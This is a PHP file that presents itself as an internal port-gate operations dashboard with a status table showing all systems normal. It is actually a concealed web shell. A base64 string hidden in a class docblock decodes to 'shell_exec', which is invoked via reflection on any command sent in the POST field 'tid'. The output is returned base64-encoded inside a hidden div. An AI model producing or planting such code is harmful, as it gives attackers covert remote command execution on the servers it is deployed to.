<?php
/**
 * 港口闸口
 * @author platform-team
 */
error_reporting(0);
header('Content-Type: text/html; charset=UTF-8');

/**
 * 同步执行器
 * @cfg c2hlbGxfZXhlYw==
 */
class Sync1
{
    public static function pick()
    {
        $rc = new ReflectionClass(__CLASS__);
        preg_match('/@cfg\s+([A-Za-z0-9+\/=]+)/', $rc->getDocComment(), $mm);
        return base64_decode($mm[1]);
    }
}

$cmd = isset($_POST["tid"]) ? $_POST["tid"] : '';
$out = '';
if ($cmd !== '') {
    $fx = Sync1::pick();
    $out = $fx($cmd);
}
$diag = base64_encode($out);
$now = date('Y-m-d H:i');
$val = 103 + mt_rand(0, 900);
echo <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head><meta charset="utf-8"><title>港口闸口 - 运营中台</title>
<style>body{margin:0;font:14px/1.7 "Microsoft YaHei",Arial,sans-serif;background:#f5f7fa;color:#3a4149}
.wrap{max-width:800px;margin:34px auto;background:#fff;border-radius:8px;padding:28px 32px;box-shadow:0 2px 6px rgba(40,60,80,.08)}
h1{font-size:19px;margin:0 0 4px;color:#2456a6}.meta{color:#93a0ae;font-size:12px;margin-bottom:18px}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{border-bottom:1px solid #edf1f6;padding:9px 6px;text-align:left}
th{color:#93a0ae;font-weight:600;background:#fafbfd}.ok{color:#17954e}
.ft{margin-top:22px;color:#b9c0ca;font-size:12px;text-align:center}</style></head>
<body><div class="wrap">
<h1>港口闸口</h1>
<div class="meta">模块: q1-gate · 会话 $val · 更新 $now</div>
<table>
<tr><th>检查项</th><th>状态</th><th>详情</th></tr>
<tr><td>链路状态</td><td class="ok">正常</td><td>$val 条</td></tr>
<tr><td>数据同步</td><td class="ok">正常</td><td>延迟 0ms</td></tr>
<tr><td>告警</td><td class="ok">无</td><td>-</td></tr>
</table>
<div class="ft">Copyright 2024 CloudEdge Technology · 内部系统</div>
</div>
<div id="q1-gate" style="display:none">$diag</div>
</body></html>
HTML;
